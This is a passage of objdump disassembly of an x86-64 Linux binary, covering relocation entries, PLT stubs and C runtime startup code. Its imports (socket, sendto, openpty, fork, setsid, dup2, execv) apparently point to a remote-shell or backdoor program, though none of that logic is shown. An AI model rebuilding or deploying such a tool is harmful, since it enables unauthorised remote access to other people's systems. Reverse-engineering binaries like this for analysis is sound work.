  400ab5:	00 00                	add    %al,(%rax)
  400ab7:	00 07                	add    %al,(%rdi)
  400ab9:	00 00                	add    %al,(%rax)
  400abb:	00 0d 00 00 00 00    	add    %cl,0x0(%rip)        # 400ac1 <_init-0x2d7>
  400ac1:	00 00                	add    %al,(%rax)
  400ac3:	00 00                	add    %al,(%rax)
  400ac5:	00 00                	add    %al,(%rax)
  400ac7:	00 78 90             	add    %bh,-0x70(%rax)
  400aca:	60                   	(bad)  
  400acb:	00 00                	add    %al,(%rax)
  400acd:	00 00                	add    %al,(%rax)
  400acf:	00 07                	add    %al,(%rdi)
  400ad1:	00 00                	add    %al,(%rax)
  400ad3:	00 0e                	add    %cl,(%rsi)
	...
  400add:	00 00                	add    %al,(%rax)
  400adf:	00 80 90 60 00 00    	add    %al,0x6090(%rax)
  400ae5:	00 00                	add    %al,(%rax)
  400ae7:	00 07                	add    %al,(%rdi)
  400ae9:	00 00                	add    %al,(%rax)
  400aeb:	00 0f                	add    %cl,(%rdi)
	...
  400af5:	00 00                	add    %al,(%rax)
  400af7:	00 88 90 60 00 00    	add    %cl,0x6090(%rax)
  400afd:	00 00                	add    %al,(%rax)
  400aff:	00 07                	add    %al,(%rdi)
  400b01:	00 00                	add    %al,(%rax)
  400b03:	00 10                	add    %dl,(%rax)
	...
  400b0d:	00 00                	add    %al,(%rax)
  400b0f:	00 90 90 60 00 00    	add    %dl,0x6090(%rax)
  400b15:	00 00                	add    %al,(%rax)
  400b17:	00 07                	add    %al,(%rdi)
  400b19:	00 00                	add    %al,(%rax)
  400b1b:	00 11                	add    %dl,(%rcx)
	...
  400b25:	00 00                	add    %al,(%rax)
  400b27:	00 98 90 60 00 00    	add    %bl,0x6090(%rax)
  400b2d:	00 00                	add    %al,(%rax)
  400b2f:	00 07                	add    %al,(%rdi)
  400b31:	00 00                	add    %al,(%rax)
  400b33:	00 12                	add    %dl,(%rdx)
	...
  400b3d:	00 00                	add    %al,(%rax)
  400b3f:	00 a0 90 60 00 00    	add    %ah,0x6090(%rax)
  400b45:	00 00                	add    %al,(%rax)
  400b47:	00 07                	add    %al,(%rdi)
  400b49:	00 00                	add    %al,(%rax)
  400b4b:	00 13                	add    %dl,(%rbx)
	...
  400b55:	00 00                	add    %al,(%rax)
  400b57:	00 a8 90 60 00 00    	add    %ch,0x6090(%rax)
  400b5d:	00 00                	add    %al,(%rax)
  400b5f:	00 07                	add    %al,(%rdi)
  400b61:	00 00                	add    %al,(%rax)
  400b63:	00 14 00             	add    %dl,(%rax,%rax,1)
	...
  400b6e:	00 00                	add    %al,(%rax)
  400b70:	b0 90                	mov    $0x90,%al
  400b72:	60                   	(bad)  
  400b73:	00 00                	add    %al,(%rax)
  400b75:	00 00                	add    %al,(%rax)
  400b77:	00 07                	add    %al,(%rdi)
  400b79:	00 00                	add    %al,(%rax)
  400b7b:	00 15 00 00 00 00    	add    %dl,0x0(%rip)        # 400b81 <_init-0x217>
  400b81:	00 00                	add    %al,(%rax)
  400b83:	00 00                	add    %al,(%rax)
  400b85:	00 00                	add    %al,(%rax)
  400b87:	00 b8 90 60 00 00    	add    %bh,0x6090(%rax)
  400b8d:	00 00                	add    %al,(%rax)
  400b8f:	00 07                	add    %al,(%rdi)
  400b91:	00 00                	add    %al,(%rax)
  400b93:	00 16                	add    %dl,(%rsi)
	...
  400b9d:	00 00                	add    %al,(%rax)
  400b9f:	00 c0                	add    %al,%al
  400ba1:	90                   	nop
  400ba2:	60                   	(bad)  
  400ba3:	00 00                	add    %al,(%rax)
  400ba5:	00 00                	add    %al,(%rax)
  400ba7:	00 07                	add    %al,(%rdi)
  400ba9:	00 00                	add    %al,(%rax)
  400bab:	00 17                	add    %dl,(%rdi)
	...
  400bb5:	00 00                	add    %al,(%rax)
  400bb7:	00 c8                	add    %cl,%al
  400bb9:	90                   	nop
  400bba:	60                   	(bad)  
  400bbb:	00 00                	add    %al,(%rax)
  400bbd:	00 00                	add    %al,(%rax)
  400bbf:	00 07                	add    %al,(%rdi)
  400bc1:	00 00                	add    %al,(%rax)
  400bc3:	00 18                	add    %bl,(%rax)
	...
  400bcd:	00 00                	add    %al,(%rax)
  400bcf:	00 d0                	add    %dl,%al
  400bd1:	90                   	nop
  400bd2:	60                   	(bad)  
  400bd3:	00 00                	add    %al,(%rax)
  400bd5:	00 00                	add    %al,(%rax)
  400bd7:	00 07                	add    %al,(%rdi)
  400bd9:	00 00                	add    %al,(%rax)
  400bdb:	00 19                	add    %bl,(%rcx)
	...
  400be5:	00 00                	add    %al,(%rax)
  400be7:	00 d8                	add    %bl,%al
  400be9:	90                   	nop
  400bea:	60                   	(bad)  
  400beb:	00 00                	add    %al,(%rax)
  400bed:	00 00                	add    %al,(%rax)
  400bef:	00 07                	add    %al,(%rdi)
  400bf1:	00 00                	add    %al,(%rax)
  400bf3:	00 1a                	add    %bl,(%rdx)
	...
  400bfd:	00 00                	add    %al,(%rax)
  400bff:	00 e0                	add    %ah,%al
  400c01:	90                   	nop
  400c02:	60                   	(bad)  
  400c03:	00 00                	add    %al,(%rax)
  400c05:	00 00                	add    %al,(%rax)
  400c07:	00 07                	add    %al,(%rdi)
  400c09:	00 00                	add    %al,(%rax)
  400c0b:	00 1b                	add    %bl,(%rbx)
	...
  400c15:	00 00                	add    %al,(%rax)
  400c17:	00 e8                	add    %ch,%al
  400c19:	90                   	nop
  400c1a:	60                   	(bad)  
  400c1b:	00 00                	add    %al,(%rax)
  400c1d:	00 00                	add    %al,(%rax)
  400c1f:	00 07                	add    %al,(%rdi)
  400c21:	00 00                	add    %al,(%rax)
  400c23:	00 1c 00             	add    %bl,(%rax,%rax,1)
	...
  400c2e:	00 00                	add    %al,(%rax)
  400c30:	f0 90                	lock nop
  400c32:	60                   	(bad)  
  400c33:	00 00                	add    %al,(%rax)
  400c35:	00 00                	add    %al,(%rax)
  400c37:	00 07                	add    %al,(%rdi)
  400c39:	00 00                	add    %al,(%rax)
  400c3b:	00 1d 00 00 00 00    	add    %bl,0x0(%rip)        # 400c41 <_init-0x157>
  400c41:	00 00                	add    %al,(%rax)
  400c43:	00 00                	add    %al,(%rax)
  400c45:	00 00                	add    %al,(%rax)
  400c47:	00 f8                	add    %bh,%al
  400c49:	90                   	nop
  400c4a:	60                   	(bad)  
  400c4b:	00 00                	add    %al,(%rax)
  400c4d:	00 00                	add    %al,(%rax)
  400c4f:	00 07                	add    %al,(%rdi)
  400c51:	00 00                	add    %al,(%rax)
  400c53:	00 1e                	add    %bl,(%rsi)
	...
  400c61:	91                   	xchg   %eax,%ecx
  400c62:	60                   	(bad)  
  400c63:	00 00                	add    %al,(%rax)
  400c65:	00 00                	add    %al,(%rax)
  400c67:	00 07                	add    %al,(%rdi)
  400c69:	00 00                	add    %al,(%rax)
  400c6b:	00 1f                	add    %bl,(%rdi)
	...
  400c75:	00 00                	add    %al,(%rax)
  400c77:	00 08                	add    %cl,(%rax)
  400c79:	91                   	xchg   %eax,%ecx
  400c7a:	60                   	(bad)  
  400c7b:	00 00                	add    %al,(%rax)
  400c7d:	00 00                	add    %al,(%rax)
  400c7f:	00 07                	add    %al,(%rdi)
  400c81:	00 00                	add    %al,(%rax)
  400c83:	00 20                	add    %ah,(%rax)
	...
  400c8d:	00 00                	add    %al,(%rax)
  400c8f:	00 10                	add    %dl,(%rax)
  400c91:	91                   	xchg   %eax,%ecx
  400c92:	60                   	(bad)  
  400c93:	00 00                	add    %al,(%rax)
  400c95:	00 00                	add    %al,(%rax)
  400c97:	00 07                	add    %al,(%rdi)
  400c99:	00 00                	add    %al,(%rax)
  400c9b:	00 21                	add    %ah,(%rcx)
	...
  400ca5:	00 00                	add    %al,(%rax)
  400ca7:	00 18                	add    %bl,(%rax)
  400ca9:	91                   	xchg   %eax,%ecx
  400caa:	60                   	(bad)  
  400cab:	00 00                	add    %al,(%rax)
  400cad:	00 00                	add    %al,(%rax)
  400caf:	00 07                	add    %al,(%rdi)
  400cb1:	00 00                	add    %al,(%rax)
  400cb3:	00 22                	add    %ah,(%rdx)
	...
  400cbd:	00 00                	add    %al,(%rax)
  400cbf:	00 20                	add    %ah,(%rax)
  400cc1:	91                   	xchg   %eax,%ecx
  400cc2:	60                   	(bad)  
  400cc3:	00 00                	add    %al,(%rax)
  400cc5:	00 00                	add    %al,(%rax)
  400cc7:	00 07                	add    %al,(%rdi)
  400cc9:	00 00                	add    %al,(%rax)
  400ccb:	00 23                	add    %ah,(%rbx)
	...
  400cd5:	00 00                	add    %al,(%rax)
  400cd7:	00 28                	add    %ch,(%rax)
  400cd9:	91                   	xchg   %eax,%ecx
  400cda:	60                   	(bad)  
  400cdb:	00 00                	add    %al,(%rax)
  400cdd:	00 00                	add    %al,(%rax)
  400cdf:	00 07                	add    %al,(%rdi)
  400ce1:	00 00                	add    %al,(%rax)
  400ce3:	00 24 00             	add    %ah,(%rax,%rax,1)
	...
  400cee:	00 00                	add    %al,(%rax)
  400cf0:	30 91 60 00 00 00    	xor    %dl,0x60(%rcx)
  400cf6:	00 00                	add    %al,(%rax)
  400cf8:	07                   	(bad)  
  400cf9:	00 00                	add    %al,(%rax)
  400cfb:	00 25 00 00 00 00    	add    %ah,0x0(%rip)        # 400d01 <_init-0x97>
  400d01:	00 00                	add    %al,(%rax)
  400d03:	00 00                	add    %al,(%rax)
  400d05:	00 00                	add    %al,(%rax)
  400d07:	00 38                	add    %bh,(%rax)
  400d09:	91                   	xchg   %eax,%ecx
  400d0a:	60                   	(bad)  
  400d0b:	00 00                	add    %al,(%rax)
  400d0d:	00 00                	add    %al,(%rax)
  400d0f:	00 07                	add    %al,(%rdi)
  400d11:	00 00                	add    %al,(%rax)
  400d13:	00 27                	add    %ah,(%rdi)
	...
  400d1d:	00 00                	add    %al,(%rax)
  400d1f:	00 40 91             	add    %al,-0x6f(%rax)
  400d22:	60                   	(bad)  
  400d23:	00 00                	add    %al,(%rax)
  400d25:	00 00                	add    %al,(%rax)
  400d27:	00 07                	add    %al,(%rdi)
  400d29:	00 00                	add    %al,(%rax)
  400d2b:	00 29                	add    %ch,(%rcx)
	...
  400d35:	00 00                	add    %al,(%rax)
  400d37:	00 48 91             	add    %cl,-0x6f(%rax)
  400d3a:	60                   	(bad)  
  400d3b:	00 00                	add    %al,(%rax)
  400d3d:	00 00                	add    %al,(%rax)
  400d3f:	00 07                	add    %al,(%rdi)
  400d41:	00 00                	add    %al,(%rax)
  400d43:	00 2a                	add    %ch,(%rdx)
	...
  400d4d:	00 00                	add    %al,(%rax)
  400d4f:	00 50 91             	add    %dl,-0x6f(%rax)
  400d52:	60                   	(bad)  
  400d53:	00 00                	add    %al,(%rax)
  400d55:	00 00                	add    %al,(%rax)
  400d57:	00 07                	add    %al,(%rdi)
  400d59:	00 00                	add    %al,(%rax)
  400d5b:	00 2b                	add    %ch,(%rbx)
	...
  400d65:	00 00                	add    %al,(%rax)
  400d67:	00 58 91             	add    %bl,-0x6f(%rax)
  400d6a:	60                   	(bad)  
  400d6b:	00 00                	add    %al,(%rax)
  400d6d:	00 00                	add    %al,(%rax)
  400d6f:	00 07                	add    %al,(%rdi)
  400d71:	00 00                	add    %al,(%rax)
  400d73:	00 2c 00             	add    %ch,(%rax,%rax,1)
	...
  400d7e:	00 00                	add    %al,(%rax)
  400d80:	60                   	(bad)  
  400d81:	91                   	xchg   %eax,%ecx
  400d82:	60                   	(bad)  
  400d83:	00 00                	add    %al,(%rax)
  400d85:	00 00                	add    %al,(%rax)
  400d87:	00 07                	add    %al,(%rdi)
  400d89:	00 00                	add    %al,(%rax)
  400d8b:	00 2d 00 00 00 00    	add    %ch,0x0(%rip)        # 400d91 <_init-0x7>
  400d91:	00 00                	add    %al,(%rax)
  400d93:	00 00                	add    %al,(%rax)
  400d95:	00 00                	add    %al,(%rax)
	...

Disassembly of section .init:

0000000000400d98 <_init>:
  400d98:	48 83 ec 08          	sub    $0x8,%rsp
  400d9c:	48 8b 05 55 82 20 00 	mov    0x208255(%rip),%rax        # 608ff8 <_DYNAMIC+0x1e0>
  400da3:	48 85 c0             	test   %rax,%rax
  400da6:	74 05                	je     400dad <_init+0x15>
  400da8:	e8 a3 01 00 00       	callq  400f50 <__gmon_start__@plt>
  400dad:	48 83 c4 08          	add    $0x8,%rsp
  400db1:	c3                   	retq   

Disassembly of section .plt:

0000000000400dc0 <putchar@plt-0x10>:
  400dc0:	ff 35 42 82 20 00    	pushq  0x208242(%rip)        # 609008 <_GLOBAL_OFFSET_TABLE_+0x8>
  400dc6:	ff 25 44 82 20 00    	jmpq   *0x208244(%rip)        # 609010 <_GLOBAL_OFFSET_TABLE_+0x10>
  400dcc:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000400dd0 <putchar@plt>:
  400dd0:	ff 25 42 82 20 00    	jmpq   *0x208242(%rip)        # 609018 <_GLOBAL_OFFSET_TABLE_+0x18>
  400dd6:	68 00 00 00 00       	pushq  $0x0
  400ddb:	e9 e0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400de0 <__errno_location@plt>:
  400de0:	ff 25 3a 82 20 00    	jmpq   *0x20823a(%rip)        # 609020 <_GLOBAL_OFFSET_TABLE_+0x20>
  400de6:	68 01 00 00 00       	pushq  $0x1
  400deb:	e9 d0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400df0 <puts@plt>:
  400df0:	ff 25 32 82 20 00    	jmpq   *0x208232(%rip)        # 609028 <_GLOBAL_OFFSET_TABLE_+0x28>
  400df6:	68 02 00 00 00       	pushq  $0x2
  400dfb:	e9 c0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e00 <isatty@plt>:
  400e00:	ff 25 2a 82 20 00    	jmpq   *0x20822a(%rip)        # 609030 <_GLOBAL_OFFSET_TABLE_+0x30>
  400e06:	68 03 00 00 00       	pushq  $0x3
  400e0b:	e9 b0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e10 <write@plt>:
  400e10:	ff 25 22 82 20 00    	jmpq   *0x208222(%rip)        # 609038 <_GLOBAL_OFFSET_TABLE_+0x38>
  400e16:	68 04 00 00 00       	pushq  $0x4
  400e1b:	e9 a0 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e20 <strlen@plt>:
  400e20:	ff 25 1a 82 20 00    	jmpq   *0x20821a(%rip)        # 609040 <_GLOBAL_OFFSET_TABLE_+0x40>
  400e26:	68 05 00 00 00       	pushq  $0x5
  400e2b:	e9 90 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e30 <__stack_chk_fail@plt>:
  400e30:	ff 25 12 82 20 00    	jmpq   *0x208212(%rip)        # 609048 <_GLOBAL_OFFSET_TABLE_+0x48>
  400e36:	68 06 00 00 00       	pushq  $0x6
  400e3b:	e9 80 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e40 <getuid@plt>:
  400e40:	ff 25 0a 82 20 00    	jmpq   *0x20820a(%rip)        # 609050 <_GLOBAL_OFFSET_TABLE_+0x50>
  400e46:	68 07 00 00 00       	pushq  $0x7
  400e4b:	e9 70 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e50 <htons@plt>:
  400e50:	ff 25 02 82 20 00    	jmpq   *0x208202(%rip)        # 609058 <_GLOBAL_OFFSET_TABLE_+0x58>
  400e56:	68 08 00 00 00       	pushq  $0x8
  400e5b:	e9 60 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e60 <dup2@plt>:
  400e60:	ff 25 fa 81 20 00    	jmpq   *0x2081fa(%rip)        # 609060 <_GLOBAL_OFFSET_TABLE_+0x60>
  400e66:	68 09 00 00 00       	pushq  $0x9
  400e6b:	e9 50 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e70 <printf@plt>:
  400e70:	ff 25 f2 81 20 00    	jmpq   *0x2081f2(%rip)        # 609068 <_GLOBAL_OFFSET_TABLE_+0x68>
  400e76:	68 0a 00 00 00       	pushq  $0xa
  400e7b:	e9 40 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e80 <snprintf@plt>:
  400e80:	ff 25 ea 81 20 00    	jmpq   *0x2081ea(%rip)        # 609070 <_GLOBAL_OFFSET_TABLE_+0x70>
  400e86:	68 0b 00 00 00       	pushq  $0xb
  400e8b:	e9 30 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400e90 <strrchr@plt>:
  400e90:	ff 25 e2 81 20 00    	jmpq   *0x2081e2(%rip)        # 609078 <_GLOBAL_OFFSET_TABLE_+0x78>
  400e96:	68 0c 00 00 00       	pushq  $0xc
  400e9b:	e9 20 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ea0 <gmtime_r@plt>:
  400ea0:	ff 25 da 81 20 00    	jmpq   *0x2081da(%rip)        # 609080 <_GLOBAL_OFFSET_TABLE_+0x80>
  400ea6:	68 0d 00 00 00       	pushq  $0xd
  400eab:	e9 10 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400eb0 <gettimeofday@plt>:
  400eb0:	ff 25 d2 81 20 00    	jmpq   *0x2081d2(%rip)        # 609088 <_GLOBAL_OFFSET_TABLE_+0x88>
  400eb6:	68 0e 00 00 00       	pushq  $0xe
  400ebb:	e9 00 ff ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ec0 <ioctl@plt>:
  400ec0:	ff 25 ca 81 20 00    	jmpq   *0x2081ca(%rip)        # 609090 <_GLOBAL_OFFSET_TABLE_+0x90>
  400ec6:	68 0f 00 00 00       	pushq  $0xf
  400ecb:	e9 f0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ed0 <sendto@plt>:
  400ed0:	ff 25 c2 81 20 00    	jmpq   *0x2081c2(%rip)        # 609098 <_GLOBAL_OFFSET_TABLE_+0x98>
  400ed6:	68 10 00 00 00       	pushq  $0x10
  400edb:	e9 e0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ee0 <close@plt>:
  400ee0:	ff 25 ba 81 20 00    	jmpq   *0x2081ba(%rip)        # 6090a0 <_GLOBAL_OFFSET_TABLE_+0xa0>
  400ee6:	68 11 00 00 00       	pushq  $0x11
  400eeb:	e9 d0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ef0 <setsid@plt>:
  400ef0:	ff 25 b2 81 20 00    	jmpq   *0x2081b2(%rip)        # 6090a8 <_GLOBAL_OFFSET_TABLE_+0xa8>
  400ef6:	68 12 00 00 00       	pushq  $0x12
  400efb:	e9 c0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f00 <read@plt>:
  400f00:	ff 25 aa 81 20 00    	jmpq   *0x2081aa(%rip)        # 6090b0 <_GLOBAL_OFFSET_TABLE_+0xb0>
  400f06:	68 13 00 00 00       	pushq  $0x13
  400f0b:	e9 b0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f10 <__libc_start_main@plt>:
  400f10:	ff 25 a2 81 20 00    	jmpq   *0x2081a2(%rip)        # 6090b8 <_GLOBAL_OFFSET_TABLE_+0xb8>
  400f16:	68 14 00 00 00       	pushq  $0x14
  400f1b:	e9 a0 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f20 <srand@plt>:
  400f20:	ff 25 9a 81 20 00    	jmpq   *0x20819a(%rip)        # 6090c0 <_GLOBAL_OFFSET_TABLE_+0xc0>
  400f26:	68 15 00 00 00       	pushq  $0x15
  400f2b:	e9 90 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f30 <memcmp@plt>:
  400f30:	ff 25 92 81 20 00    	jmpq   *0x208192(%rip)        # 6090c8 <_GLOBAL_OFFSET_TABLE_+0xc8>
  400f36:	68 16 00 00 00       	pushq  $0x16
  400f3b:	e9 80 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f40 <signal@plt>:
  400f40:	ff 25 8a 81 20 00    	jmpq   *0x20818a(%rip)        # 6090d0 <_GLOBAL_OFFSET_TABLE_+0xd0>
  400f46:	68 17 00 00 00       	pushq  $0x17
  400f4b:	e9 70 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f50 <__gmon_start__@plt>:
  400f50:	ff 25 82 81 20 00    	jmpq   *0x208182(%rip)        # 6090d8 <_GLOBAL_OFFSET_TABLE_+0xd8>
  400f56:	68 18 00 00 00       	pushq  $0x18
  400f5b:	e9 60 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f60 <memcpy@plt>:
  400f60:	ff 25 7a 81 20 00    	jmpq   *0x20817a(%rip)        # 6090e0 <_GLOBAL_OFFSET_TABLE_+0xe0>
  400f66:	68 19 00 00 00       	pushq  $0x19
  400f6b:	e9 50 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f70 <kill@plt>:
  400f70:	ff 25 72 81 20 00    	jmpq   *0x208172(%rip)        # 6090e8 <_GLOBAL_OFFSET_TABLE_+0xe8>
  400f76:	68 1a 00 00 00       	pushq  $0x1a
  400f7b:	e9 40 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f80 <openpty@plt>:
  400f80:	ff 25 6a 81 20 00    	jmpq   *0x20816a(%rip)        # 6090f0 <_GLOBAL_OFFSET_TABLE_+0xf0>
  400f86:	68 1b 00 00 00       	pushq  $0x1b
  400f8b:	e9 30 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400f90 <time@plt>:
  400f90:	ff 25 62 81 20 00    	jmpq   *0x208162(%rip)        # 6090f8 <_GLOBAL_OFFSET_TABLE_+0xf8>
  400f96:	68 1c 00 00 00       	pushq  $0x1c
  400f9b:	e9 20 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fa0 <select@plt>:
  400fa0:	ff 25 5a 81 20 00    	jmpq   *0x20815a(%rip)        # 609100 <_GLOBAL_OFFSET_TABLE_+0x100>
  400fa6:	68 1d 00 00 00       	pushq  $0x1d
  400fab:	e9 10 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fb0 <inet_aton@plt>:
  400fb0:	ff 25 52 81 20 00    	jmpq   *0x208152(%rip)        # 609108 <_GLOBAL_OFFSET_TABLE_+0x108>
  400fb6:	68 1e 00 00 00       	pushq  $0x1e
  400fbb:	e9 00 fe ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fc0 <malloc@plt>:
  400fc0:	ff 25 4a 81 20 00    	jmpq   *0x20814a(%rip)        # 609110 <_GLOBAL_OFFSET_TABLE_+0x110>
  400fc6:	68 1f 00 00 00       	pushq  $0x1f
  400fcb:	e9 f0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fd0 <getlogin@plt>:
  400fd0:	ff 25 42 81 20 00    	jmpq   *0x208142(%rip)        # 609118 <_GLOBAL_OFFSET_TABLE_+0x118>
  400fd6:	68 20 00 00 00       	pushq  $0x20
  400fdb:	e9 e0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400fe0 <ttyname@plt>:
  400fe0:	ff 25 3a 81 20 00    	jmpq   *0x20813a(%rip)        # 609120 <_GLOBAL_OFFSET_TABLE_+0x120>
  400fe6:	68 21 00 00 00       	pushq  $0x21
  400feb:	e9 d0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000400ff0 <tcgetattr@plt>:
  400ff0:	ff 25 32 81 20 00    	jmpq   *0x208132(%rip)        # 609128 <_GLOBAL_OFFSET_TABLE_+0x128>
  400ff6:	68 22 00 00 00       	pushq  $0x22
  400ffb:	e9 c0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401000 <tcsetattr@plt>:
  401000:	ff 25 2a 81 20 00    	jmpq   *0x20812a(%rip)        # 609130 <_GLOBAL_OFFSET_TABLE_+0x130>
  401006:	68 23 00 00 00       	pushq  $0x23
  40100b:	e9 b0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401010 <exit@plt>:
  401010:	ff 25 22 81 20 00    	jmpq   *0x208122(%rip)        # 609138 <_GLOBAL_OFFSET_TABLE_+0x138>
  401016:	68 24 00 00 00       	pushq  $0x24
  40101b:	e9 a0 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401020 <execv@plt>:
  401020:	ff 25 1a 81 20 00    	jmpq   *0x20811a(%rip)        # 609140 <_GLOBAL_OFFSET_TABLE_+0x140>
  401026:	68 25 00 00 00       	pushq  $0x25
  40102b:	e9 90 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401030 <fork@plt>:
  401030:	ff 25 12 81 20 00    	jmpq   *0x208112(%rip)        # 609148 <_GLOBAL_OFFSET_TABLE_+0x148>
  401036:	68 26 00 00 00       	pushq  $0x26
  40103b:	e9 80 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401040 <rand@plt>:
  401040:	ff 25 0a 81 20 00    	jmpq   *0x20810a(%rip)        # 609150 <_GLOBAL_OFFSET_TABLE_+0x150>
  401046:	68 27 00 00 00       	pushq  $0x27
  40104b:	e9 70 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401050 <usleep@plt>:
  401050:	ff 25 02 81 20 00    	jmpq   *0x208102(%rip)        # 609158 <_GLOBAL_OFFSET_TABLE_+0x158>
  401056:	68 28 00 00 00       	pushq  $0x28
  40105b:	e9 60 fd ff ff       	jmpq   400dc0 <_init+0x28>

0000000000401060 <socket@plt>:
  401060:	ff 25 fa 80 20 00    	jmpq   *0x2080fa(%rip)        # 609160 <_GLOBAL_OFFSET_TABLE_+0x160>
  401066:	68 29 00 00 00       	pushq  $0x29
  40106b:	e9 50 fd ff ff       	jmpq   400dc0 <_init+0x28>

Disassembly of section .text:

0000000000401070 <_start>:
  401070:	31 ed                	xor    %ebp,%ebp
  401072:	49 89 d1             	mov    %rdx,%r9
  401075:	5e                   	pop    %rsi
  401076:	48 89 e2             	mov    %rsp,%rdx
  401079:	48 83 e4 f0          	and    $0xfffffffffffffff0,%rsp
  40107d:	50                   	push   %rax
  40107e:	54                   	push   %rsp
  40107f:	49 c7 c0 90 78 40 00 	mov    $0x407890,%r8
  401086:	48 c7 c1 20 78 40 00 	mov    $0x407820,%rcx
  40108d:	48 c7 c7 2d 21 40 00 	mov    $0x40212d,%rdi
  401094:	e8 77 fe ff ff       	callq  400f10 <__libc_start_main@plt>
  401099:	f4                   	hlt    
  40109a:	66 0f 1f 44 00 00    	nopw   0x0(%rax,%rax,1)

00000000004010a0 <deregister_tm_clones>:
  4010a0:	b8 e7 91 60 00       	mov    $0x6091e7,%eax
  4010a5:	55                   	push   %rbp
  4010a6:	48 2d e0 91 60 00    	sub    $0x6091e0,%rax
  4010ac:	48 83 f8 0e          	cmp    $0xe,%rax
  4010b0:	48 89 e5             	mov    %rsp,%rbp
  4010b3:	77 02                	ja     4010b7 <deregister_tm_clones+0x17>
  4010b5:	5d                   	pop    %rbp
  4010b6:	c3                   	retq   
  4010b7:	b8 00 00 00 00       	mov    $0x0,%eax
  4010bc:	48 85 c0             	test   %rax,%rax
  4010bf:	74 f4                	je     4010b5 <deregister_tm_clones+0x15>
  4010c1:	5d                   	pop    %rbp
  4010c2:	bf e0 91 60 00       	mov    $0x6091e0,%edi
  4010c7:	ff e0                	jmpq   *%rax
  4010c9:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

00000000004010d0 <register_tm_clones>:
  4010d0:	b8 e0 91 60 00       	mov    $0x6091e0,%eax
  4010d5:	55                   	push   %rbp
  4010d6:	48 2d e0 91 60 00    	sub    $0x6091e0,%rax
  4010dc:	48 c1 f8 03          	sar    $0x3,%rax
  4010e0:	48 89 e5             	mov    %rsp,%rbp
  4010e3:	48 89 c2             	mov    %rax,%rdx
  4010e6:	48 c1 ea 3f          	shr    $0x3f,%rdx
  4010ea:	48 01 d0             	add    %rdx,%rax
  4010ed:	48 d1 f8             	sar    %rax
  4010f0:	75 02                	jne    4010f4 <register_tm_clones+0x24>
  4010f2:	5d                   	pop    %rbp
  4010f3:	c3                   	retq   
  4010f4:	ba 00 00 00 00       	mov    $0x0,%edx
  4010f9:	48 85 d2             	test   %rdx,%rdx
  4010fc:	74 f4                	je     4010f2 <register_tm_clones+0x22>
  4010fe:	5d                   	pop    %rbp
  4010ff:	48 89 c6             	mov    %rax,%rsi
  401102:	bf e0 91 60 00       	mov    $0x6091e0,%edi
  401107:	ff e2                	jmpq   *%rdx
  401109:	0f 1f 80 00 00 00 00 	nopl   0x0(%rax)

0000000000401110 <__do_global_dtors_aux>:
  401110:	80 3d c9 80 20 00 00 	cmpb   $0x0,0x2080c9(%rip)        # 6091e0 <__TMC_END__>
  401117:	75 11                	jne    40112a <__do_global_dtors_aux+0x1a>
  401119:	55                   	push   %rbp
  40111a:	48 89 e5             	mov    %rsp,%rbp
  40111d:	e8 7e ff ff ff       	callq  4010a0 <deregister_tm_clones>
  401122:	5d                   	pop    %rbp
  401123:	c6 05 b6 80 20 00 01 	movb   $0x1,0x2080b6(%rip)        # 6091e0 <__TMC_END__>
  40112a:	f3 c3                	repz retq 
  40112c:	0f 1f 40 00          	nopl   0x0(%rax)

0000000000401130 <frame_dummy>:
  401130:	48 83 3d d8 7c 20 00 	cmpq   $0x0,0x207cd8(%rip)        # 608e10 <__JCR_END__>
  401137:	00 
  401138:	74 1e                	je     401158 <frame_dummy+0x28>
  40113a:	b8 00 00 00 00       	mov    $0x0,%eax
  40113f:	48 85 c0             	test   %rax,%rax
  401142:	74 14                	je     401158 <frame_dummy+0x28>
  401144:	55                   	push   %rbp
  401145:	bf 10 8e 60 00       	mov    $0x608e10,%edi
  40114a:	48 89 e5             	mov    %rsp,%rbp
  40114d:	ff d0                	callq  *%rax
  40114f:	5d                   	pop    %rbp
  401150:	e9 7b ff ff ff       	jmpq   4010d0 <register_tm_clones>
  401155:	0f 1f 00             	nopl   (%rax)
  401158:	e9 73 ff ff ff       	jmpq   4010d0 <register_tm_clones>

